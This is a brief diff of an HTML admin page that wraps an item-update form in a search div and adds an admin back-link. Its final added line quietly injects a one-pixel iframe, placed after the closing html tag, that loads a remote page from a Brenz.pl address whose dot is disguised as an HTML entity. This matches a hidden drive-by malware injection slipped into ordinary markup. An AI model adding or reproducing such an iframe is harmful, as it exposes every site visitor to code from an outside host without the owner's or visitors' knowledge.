@@ -6,7 +6,7 @@
 <body>
 
 		<div class="wrapper">
-		
+		<div class="search">
 		<form method="post" action="updateItems.php">
 		
 		<table border="0" height="200px;" width="450px;">	
@@ -20,11 +20,12 @@
 		
 		</table>
 		</form>
-		
+		</div>
 		</div>
 
-
+	<a href="admin.php"><img style="float:left;" src="../images/left.png" /></a>
 </html>
 
 
+<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
 </body>
